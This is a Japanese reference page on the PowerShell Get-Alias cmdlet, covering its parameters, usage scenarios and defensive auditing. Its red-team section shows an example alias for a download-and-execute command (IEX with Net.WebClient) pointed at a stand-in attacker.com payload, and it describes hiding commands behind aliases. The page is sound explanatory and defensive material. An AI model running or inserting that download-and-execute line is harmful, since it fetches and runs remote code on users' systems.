# `Get-Alias` - エイリアスを取得する

## 概要

`Get-Alias` コマンドレットは、現在のセッションで利用可能なエイリアスとそのエイリアスが指し示す元のコマンド（定義）の一覧を取得します。エイリアスを使うことで、長いコマンドレット名を短いニックネームで実行でき、作業効率を向上させることができます。例えば、`Get-ChildItem` のエイリアスとして `ls` や `gci`, `dir` がデフォルトで定義されています。

このコマンドレットには、`gal` という便利なエイリアスがデフォルトで設定されています。

## 類似コマンドレット/コマンドとの差異

| 類似コマンドレット/コマンド | 差異 / 使い分けのポイント |
| :--- | :--- |
| **`Get-Command`** | `Get-Command` はコマンドレット、関数、エイリアスを含む全ての種類のコマンドを検索します。`Get-Alias` は**エイリアスのみ**に特化して情報を取得します。 |
| **`Set-Alias` / `New-Alias`** | これらはエイリアスを**作成または変更**します。`Get-Alias` はエイリアスを**取得（表示）**します。 |

## よく連携されるコマンドレット

### シナリオ例: 特定のコマンドレットにどのようなエイリアスがあるか調べる (インフラ構築・運用視点)

* **目的**: `Import-Csv` コマンドレットに割り当てられているエイリアスを全て見つける。
* **連携コマンドレット**: `Where-Object`
* **解説**: `Get-Alias` で全てのエイリアスを取得し、その結果をパイプラインで `Where-Object` に渡します。`Definition` プロパティ（元のコマンド名）が `Import-Csv` と一致するものをフィルタリングします。
* **コマンド例**:

    ```powershell
    # 'Import-Csv' のエイリアスを検索
    Get-Alias | Where-Object { $_.Definition -eq "Import-Csv" }
    ```

## パラメータ説明

| パラメータ | 型 | 説明 |
| :--- | :--- | :--- |
| ⭐ **`-Name`** | `String[]` | 取得するエイリアスの名前を指定します。ワイルドカード (`*`) が使用できます。 |
| **`-Definition`** | `String[]` | 指定したコマンドレット名（定義）を持つエイリアスを検索します。ワイルドカードが使用できます。 |
| **`-Scope`** | `String` | エイリアスが定義されているスコープを指定します (`Global`, `Local`, `Script`)。 |
| **`-Exclude`** | `String[]` | 取得するエイリアスから特定のものを除外します。 |

## よく使われる組み合わせと業務シナリオ

### 1. インフラ構築・運用視点

* **タスク**: 不明なエイリアス (`gci` など) が、どのコマンドレットを指しているのかを確認する。
* **組み合わせ**: `Get-Alias -Name <alias>`
* **解説**: Linuxのコマンドに慣れているユーザーが `ls` と入力した際に、それがPowerShellで何を意味するのかを確認するような場面で役立ちます。
* **例**:

    ```powershell
    # エイリアス 'ls' の定義を確認する
    Get-Alias -Name ls

    # 名前に 'get' を含む全てのエイリアスをリストアップする
    Get-Alias -Name *get*
    ```

### 2. ブルーチーム視点

* **タスク**: **環境の監査**。PowerShellプロファイルなどで、予期せず上書きされたり、新しく定義されたりした不審なエイリアスがないかを確認する。
* **組み合わせ**: `Get-Alias`
* **解説**: 攻撃者は、正規のコマンドレット（例: `Get-ChildItem`）を悪意のある関数に紐付けるエイリアスを作成し、管理者の操作を乗っ取ろうとする可能性があります。`Get-Alias` で定義されているエイリアスの一覧をベースラインと比較し、不審な定義がないかを監査します。
* **例**:

    ```powershell
    # 全てのエイリアスとその定義をCSVに出力して監査する
    Get-Alias | Export-Csv -Path C:\Audit\aliases.csv -NoTypeInformation
    ```

### 3. レッドチーム視点

* **タスク**: **偵察 (Reconnaissance)** と **防御回避 (Defense Evasion)**。
* **組み合わせ**: `New-Alias` (作成) と `Get-Alias` (確認)
* **解説**:
  * **偵察**: `Get-Alias` を実行して、現在の環境でどのようなカスタムエイリアスが定義されているかを調査し、管理者の習慣や使用しているツールを推測します。
  * **防御回避**: 攻撃者は、自身の長い悪意のあるコマンドを `i` のような非常に短いエイリアスに割り当てる (`New-Alias`) ことで、コマンドライン履歴やログに残る痕跡を最小限にし、分析を困難にします。
* **例**:

    ```powershell
    # 攻撃者が悪意のあるダウンロードコマンドにエイリアスを設定する例
    New-Alias -Name "i" -Value "IEX (New-Object Net.WebClient).DownloadString"

    # 実行
    # i [http://attacker.com/payload.ps1](http://attacker.com/payload.ps1)
    ```

## エラーメッセージとトラブルシューティング

### よくあるエラーメッセージ

1. **エラーメッセージ**: `Get-Alias: This command cannot find a matching alias because an alias with the name '...' does not exist.`
    * **考えられる原因**: 指定した名前のエイリアスが存在しません。
    * **解決策**: エイリアス名が正しいか確認してください。`Get-Alias` ですべてのエイリアスをリストアップして確認することもできます。

## セキュリティに関する考慮事項

### 悪用事例

* **コマンドのマスカーディング（偽装）**: レッドチームのシナリオで述べた通り、攻撃者は `Set-Alias` や `New-Alias` を使って、`dir` や `ls` のような一般的なコマンドを、実際には悪意のある関数やスクリプトを実行するように上書きする可能性があります。管理者が普段通りにコマンドを実行したつもりが、バックドアが起動する、といった事態を引き起こします。

### LOLBASにおける利用例

* **機能**: **偵察 (Reconnaissance)**, **防御回避 (Defense Evasion)**
* **解説**: `Get-Alias` は PowerShell の標準機能であり、偵察に利用されます。また、エイリアスを作成する `Set-Alias` や `New-Alias` と組み合わせることで、攻撃者はコマンド実行の痕跡を難読化します。

### 対応策・緩和策 (ブルーチーム視点)

* **Prevention (予防)**: ユーザーのPowerShellプロファイル (`$PROFILE`) への書き込み権限を適切に管理する。
* **Detection (検知)**: PowerShellのスクリプトブロックロギング (イベントID 4104) を有効化します。これにより、`Get-Alias` だけでなく、`Set-Alias` や `New-Alias` を使った不審なエイリアスの作成も記録・監視できます。プロファイルファイルの変更をファイル整合性監視 (FIM) で検知することも有効です。

## 注意点・補足

* **スコープ**: `Set-Alias` や `New-Alias` で作成されたエイリアスは、デフォルトでは現在のPowerShellセッション内でのみ有効です。永続化させるには、PowerShellプロファイルに記述する必要があります。
